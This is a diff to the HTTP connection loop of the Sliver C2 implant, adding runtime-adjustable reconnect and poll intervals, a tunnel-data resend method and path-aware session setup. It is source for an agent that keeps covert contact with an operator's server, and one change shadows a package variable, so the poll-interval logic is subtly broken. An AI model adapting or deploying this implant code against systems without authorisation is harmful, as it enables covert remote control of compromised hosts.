@@ -40,6 +40,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 
 	// {{if .Config.HTTPc2Enabled}}
@@ -65,7 +66,8 @@ var (
 
 	readBufSize       = 16 * 1024 // 16kb
 	maxErrors         = getMaxConnectionErrors()
-	reconnectInterval = GetReconnectInterval()
+	reconnectInterval = -1
+	pollInterval      = -1
 
 	ccCounter = new(int)
 
@@ -125,6 +127,13 @@ func (c *Connection) RemoveTunnel(ID uint64) {
 	c.mutex.Lock()
 	defer c.mutex.Unlock()
 	delete(*c.tunnels, ID)
+}
+
+func (c *Connection) RequestResend(data []byte) {
+	c.Send <- &sliverpb.Envelope{
+		Type: sliverpb.MsgTunnelData,
+		Data: data,
+	}
 }
 
 // StartConnectionLoop - Starts the main connection loop
@@ -242,10 +251,11 @@ func StartConnectionLoop() *Connection {
 			// {{end}}
 		}
 
+		reconnect := GetReconnectInterval()
 		// {{if .Config.Debug}}
-		log.Printf("Sleep %d second(s) ...", reconnectInterval/time.Second)
+		log.Printf("Sleep %d second(s) ...", reconnect/time.Second)
 		// {{end}}
-		time.Sleep(reconnectInterval)
+		time.Sleep(reconnect)
 	}
 	// {{if .Config.Debug}}
 	log.Printf("[!] Max connection errors reached\n")
@@ -289,11 +299,36 @@ func nextCCServer() *url.URL {
 
 // GetReconnectInterval - Parse the reconnect interval inserted at compile-time
 func GetReconnectInterval() time.Duration {
-	reconnect, err := strconv.Atoi(`{{.Config.ReconnectInterval}}`)
-	if err != nil {
-		return 60 * time.Second
+	if reconnectInterval == -1 {
+		reconnect, err := strconv.Atoi(`{{.Config.ReconnectInterval}}`)
+		if err != nil {
+			return 60 * time.Second
+		}
+		return time.Duration(reconnect) * time.Second
+	} else {
+		return time.Duration(reconnectInterval) * time.Second
 	}
-	return time.Duration(reconnect) * time.Second
+}
+
+func SetReconnectInterval(interval int) {
+	reconnectInterval = interval
+}
+
+// GetPollInterval - Parse the poll interval inserted at compile-time
+func GetPollInterval() time.Duration {
+	if pollInterval == -1 {
+		pollInterval, err := strconv.Atoi(`{{.Config.PollInterval}}`)
+		if err != nil {
+			return 1 * time.Second
+		}
+		return time.Duration(pollInterval) * time.Second
+	} else {
+		return time.Duration(pollInterval) * time.Second
+	}
+}
+
+func SetPollInterval(interval int) {
+	pollInterval = interval
 }
 
 func getMaxConnectionErrors() int {
@@ -494,7 +529,7 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 	// {{if .Config.Debug}}
 	log.Printf("Connecting -> http(s)://%s", uri.Host)
 	// {{end}}
-	client, err := HTTPStartSession(uri.Host)
+	client, err := HTTPStartSession(uri.Host, uri.Path)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("http(s) connection error %v", err)
